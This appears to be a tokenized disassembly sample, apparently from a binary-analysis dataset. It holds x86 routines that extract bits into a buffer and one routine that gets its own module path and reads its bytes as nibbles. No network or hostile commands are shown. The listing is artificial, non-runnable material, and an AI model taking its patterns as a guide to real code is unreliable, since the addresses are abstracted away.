mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0x9
sar eax 0xf
and eax 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0xe
sar ecx 0xf
and ecx 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0xb
sar ecx 0xf
and ecx 0x1
je r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
shl edx 0xf
sar edx 0xf
and edx 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0xd
sar ecx 0xf
and ecx 0x1
je r-xdata
jmp r-xdata
mov edx [ rwxdata ]
add edx 0x4
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0xf
sar eax 0xf
and eax 0x1
je r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
shl edx 0xa
sar edx 0xf
and edx 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0xf
sar eax 0xf
and eax 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0xc
sar eax 0xf
and eax 0x1
je r-xdata
jmp r-xdata
mov ecx [ rwxdata ]
add ecx 0x4
mov [ rwxdata ] ecx
jmp r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0xe
sar eax 0xf
and eax 0x1
je r-xdata
mov edx [ rwxdata ]
add edx 0x7
mov [ rwxdata ] edx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0xb
sar ecx 0xf
and ecx 0x1
je r-xdata
mov edx [ rwxdata ]
add edx 0x4
mov [ rwxdata ] edx
jmp r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
shl edx 0xd
sar edx 0xf
and edx 0x1
je r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
shl edx 0xf
sar edx 0xf
and edx 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0xc
sar eax 0xf
and eax 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0xe
sar ecx 0xf
and ecx 0x1
je r-xdata
mov ecx [ rwxdata ]
add ecx 0x8
mov [ rwxdata ] ecx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
shl edx 0xd
sar edx 0xf
and edx 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0xf
sar eax 0xf
and eax 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0xe
sar ecx 0xf
and ecx 0x1
je r-xdata
mov edx [ rwxdata ]
add edx 0x9
mov [ rwxdata ] edx
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0xf
sar eax 0xf
and eax 0x1
je r-xdata
mov edx [ rwxdata ]
add edx 0xa
mov [ rwxdata ] edx
sub_4028e0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] 0x3
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
sar edx cl
and edx 0x1
je r-xdata
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp edx [ rwxdata ]
jge r-xdata
mov eax [ ebp - 0x8 ]
sub eax 0x1
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
shl edx 0xc
sar edx 0xf
and edx 0x1
je r-xdata
mov eax [ rwxdata ]
mov ecx [ ebp - 0x4 ]
mov dl [ ecx + rwxdata ]
mov [ eax + rwxdata ] dl
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x2
jne r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rwxdata ]
jge r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x8 ] 0x3
jne r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x4 ]
cmp edx [ rwxdata ]
jge r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0xc
sar ecx 0xf
and ecx 0x1
je r-xdata
mov edx [ rwxdata ]
mov eax [ ebp - 0x4 ]
mov cl [ eax + rwxdata ]
mov [ edx + rwxdata ] cl
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0xd
sar ecx 0xf
and ecx 0x1
je r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x4 ]
cmp edx [ rwxdata ]
jge r-xdata
mov edx [ ebp + 0x8 ]
shl edx 0xb
sar edx 0xf
and edx 0x1
je r-xdata
mov eax [ rwxdata ]
mov ecx [ ebp - 0x4 ]
mov dl [ ecx + rwxdata ]
mov [ eax + rwxdata ] dl
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0xe
sar eax 0xf
and eax 0x1
je r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rwxdata ]
jge r-xdata
mov edx [ ebp + 0x8 ]
shl edx 0xa
sar edx 0xf
and edx 0x1
je r-xdata
mov eax [ rwxdata ]
mov ecx [ ebp - 0x4 ]
mov dl [ ecx + rwxdata ]
mov [ eax + rwxdata ] dl
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0xd
sar eax 0xf
and eax 0x1
je r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
shl edx 0xf
sar edx 0xf
and edx 0x1
je r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0x9
sar ecx 0xf
and ecx 0x1
je r-xdata
mov edx [ rwxdata ]
mov eax [ ebp - 0x4 ]
mov cl [ eax + rwxdata ]
mov [ edx + rwxdata ] cl
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0xc
sar ecx 0xf
and ecx 0x1
je r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
shl edx 0xe
sar edx 0xf
and edx 0x1
je r-xdata
mov ecx [ rwxdata ]
add ecx 0x4
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0xb
sar ecx 0xf
and ecx 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0xd
sar eax 0xf
and eax 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0xf
sar ecx 0xf
and ecx 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0xa
sar eax 0xf
and eax 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0xc
sar eax 0xf
and eax 0x1
je r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
shl edx 0xe
sar edx 0xf
and edx 0x1
je r-xdata
mov eax [ rwxdata ]
add eax 0x4
mov [ rwxdata ] eax
jmp r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
shl edx 0xb
sar edx 0xf
and edx 0x1
je r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
shl edx 0xd
sar edx 0xf
and edx 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0xf
sar ecx 0xf
and ecx 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0xc
sar ecx 0xf
and ecx 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0xe
sar ecx 0xf
and ecx 0x1
je r-xdata
mov eax [ rwxdata ]
add eax 0x5
mov [ rwxdata ] eax
jmp r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0xd
sar eax 0xf
and eax 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0xf
sar eax 0xf
and eax 0x1
je r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
shl edx 0xe
sar edx 0xf
and edx 0x1
je r-xdata
mov edx [ rwxdata ]
add edx 0x6
mov [ rwxdata ] edx
jmp r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0xf
sar ecx 0xf
and ecx 0x1
je r-xdata
mov eax [ rwxdata ]
add eax 0x7
mov [ rwxdata ] eax
sub_403250
push ebp
mov ebp esp
sub esp 0x54
push esi
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x4c ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x48 ] 0xfa0
mov eax [ rwxdata ]
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x50 ] 0x0
mov [ ebp - 0x40 ] 0xffffffff
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov [ rwxdata ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
cmp [ ebp - 0xc ] 0xfa0
jge r-xdata
cmp [ ebp - 0x14 ] 0x10
jge r-xdata
mov ecx [ ebp - 0x40 ]
cmp ecx [ ebp - 0x8 ]
jge r-xdata
mov ecx [ ebp - 0xc ]
cmp [ ecx * 4 + rwxdata ] 0xffffffff
je r-xdata
push 0x104
push rwxdata
push 0x0
call [ GetModuleHandleA@IAT ]
push eax
call [ GetModuleFileNameA@IAT ]
push r--data
push rwxdata
call sub_40ba8a
add esp 0x8
mov [ rwxdata ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x54 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x2c ]
jl r-xdata
mov edx [ ebp - 0x40 ]
add edx 0x2
mov eax [ ebp - 0x8 ]
sub eax edx
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x50 ]
cmp ecx [ ebp - 0x28 ]
jge r-xdata
jmp r-xdata
cmp [ ebp - 0x40 ] 0xffffffff
jne r-xdata
push 0x0
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ rwxdata ]
push edx
call sub_40bfa1
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x54 ] 0x10
jge r-xdata
mov ecx [ ebp - 0x2c ]
cmp ecx [ ebp - 0x18 ]
jl r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x4c ]
jl r-xdata
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x50 ] edx
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x40 ]
add edx 0x2
mov eax [ ebp - 0xc ]
sub eax edx
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x50 ]
cmp ecx [ ebp - 0x28 ]
jge r-xdata
mov edx [ ebp - 0xc ]
mov [ ebp - 0x28 ] edx
mov eax [ ebp - 0x50 ]
cmp eax [ ebp - 0x28 ]
jge r-xdata
mov eax [ rwxdata ]
push eax
call sub_40b923
add esp 0x4
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov [ ebp - 0x14 ] 0x0
mov [ rwxdata ] 0x0
mov eax [ rwxdata ]
push eax
call sub_40c21d
add esp 0x4
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x4 ]
and edx 0xf0
sar edx 0x4
mov eax [ ebp - 0x14 ]
mov [ eax * 4 + rwxdata ] edx
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x4 ]
and edx 0xf
mov eax [ ebp - 0x14 ]
mov [ eax * 4 + rwxdata ] edx
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ rwxdata ]
mov eax [ ebp - 0x4 ]
mov [ edx * 4 + rwxdata ] eax
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov [ ebp - 0x30 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x4c ]
cmp edx [ ebp - 0x18 ]
jl r-xdata
mov edx [ ebp - 0x2c ]
cmp edx [ ebp - 0x4c ]
jl r-xdata
mov edx [ ebp - 0x18 ]
cmp edx [ ebp - 0x20 ]
jl r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax * 4 + rwxdata ] 0x0
jl r-xdata
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x50 ] edx
mov edx [ ebp - 0xc ]
cmp [ edx * 4 + rwxdata ] 0x0
jl r-xdata
mov ecx [ ebp - 0x28 ]
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x38 ] 0xffffffff
mov ecx [ rwxdata ]
push ecx
call sub_40bea9
add esp 0x4
mov [ ebp - 0x38 ] eax
jmp r-xdata
cmp [ ebp - 0x14 ] 0x4
jne r-xdata
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
cmp [ ebp - 0x30 ] 0x10
jge r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
mov eax [ ebp - 0x4c ]
cmp eax [ ebp - 0x2c ]
jl r-xdata
mov eax [ ebp - 0x2c ]
cmp eax [ ebp - 0x20 ]
jl r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x24 ]
jl r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax * 4 + rwxdata ] 0x10
jl r-xdata
mov ecx [ ebp - 0xc ]
cmp [ ecx * 4 + rwxdata ] 0x10
jge r-xdata
mov edx [ ebp - 0xc ]
cmp [ edx * 4 + rwxdata ] 0x10
jl r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax * 4 + rwxdata ] 0x10
jge r-xdata
cmp [ ebp - 0xc ] 0xfa0
jge r-xdata
mov edx [ rwxdata ]
push edx
call sub_40c09d
add esp 0x4
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov ecx [ rwxdata ]
push ecx
call sub_40c21d
add esp 0x4
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x4 ]
and eax 0xf0
sar eax 0x4
mov ecx [ ebp - 0x14 ]
mov [ ecx * 4 + rwxdata ] eax
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x4 ]
and eax 0xf
mov ecx [ ebp - 0x14 ]
mov [ ecx * 4 + rwxdata ] eax
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov eax [ rwxdata ]
mov ecx [ ebp - 0x4 ]
mov [ eax * 4 + rwxdata ] ecx
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov [ ebp - 0x14 ] 0x0
mov ecx [ rwxdata ]
shl ecx 0xf
mov edx [ rwxdata ]
shl edx 0xb
lea eax [ ecx + edx + rwxdata ]
mov ecx [ rwxdata ]
shl ecx 0x7
add eax ecx
mov edx [ rwxdata ]
cmp [ eax + edx * 8 ] 0x0
jne r-xdata
jmp r-xdata
mov [ ebp - 0x34 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x24 ]
cmp ecx [ ebp - 0x18 ]
jl r-xdata
mov ecx [ ebp - 0x20 ]
cmp ecx [ ebp - 0x2c ]
jl r-xdata
mov ecx [ ebp - 0x4c ]
cmp ecx [ ebp - 0x20 ]
jl r-xdata
